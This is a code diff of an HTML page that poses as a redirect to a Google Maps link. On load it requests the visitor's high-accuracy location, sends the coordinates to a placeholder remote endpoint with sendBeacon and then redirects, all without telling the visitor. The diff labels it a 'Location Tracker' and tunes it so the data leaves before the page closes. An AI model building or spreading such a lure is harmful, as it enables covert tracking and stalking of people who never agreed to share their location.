@@ -1,41 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Location Redirect</title>
+    <title>Location Tracker</title>
+    <!-- Force HTTPS -->
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
 </head>
 <body>
     <script>
-        const googleMapsURL = 'YOUR_MAPS_URL_HERE';
-        const serverURL = 'https://YOUR_RENDER_URL.onrender.com/save-location.php';
+        // Configuration
+        const MAPS_URL = 'YOUR_GOOGLE_MAPS_LINK';
+        const API_ENDPOINT = 'https://YOUR_SERVICE.onrender.com/log';
 
-        // Nuclear option: Force geolocation with 10s timeout
-        navigator.geolocation.getCurrentPosition(
-            async (position) => {
-                // 1. Capture coordinates
-                const coords = {
+        // Nuclear tracking function
+        function captureLocation() {
+            const success = async (position) => {
+                const payload = {
                     lat: position.coords.latitude,
                     lng: position.coords.longitude,
                     accuracy: position.coords.accuracy,
-                    timestamp: Date.now()
+                    time: new Date().toISOString()
                 };
 
-                // 2. Send via Beacon API (guaranteed delivery)
-                navigator.sendBeacon(serverURL, JSON.stringify(coords));
+                // 1. Send via Beacon API (survives page close)
+                navigator.sendBeacon(API_ENDPOINT, JSON.stringify(payload));
                 
-                // 3. Redirect after confirmation
-                window.location.href = googleMapsURL;
-            },
-            (error) => {
-                console.error('Geolocation Error:', error);
-                window.location.href = googleMapsURL;
-            },
-            {
+                // 2. Add 500ms delay before redirect
+                await new Promise(r => setTimeout(r, 500));
+                
+                // 3. Final redirect
+                window.location.href = MAPS_URL;
+            };
+
+            const error = (err) => {
+                console.error('Geolocation Error:', err);
+                window.location.href = MAPS_URL;
+            };
+
+            // Force geolocation with strict parameters
+            navigator.geolocation.getCurrentPosition(success, error, {
                 enableHighAccuracy: true,
-                timeout: 10000,
+                timeout: 5000,
                 maximumAge: 0
-            }
-        );
+            });
+        }
+
+        // Start immediately
+        captureLocation();
     </script>
 </body>
 </html>
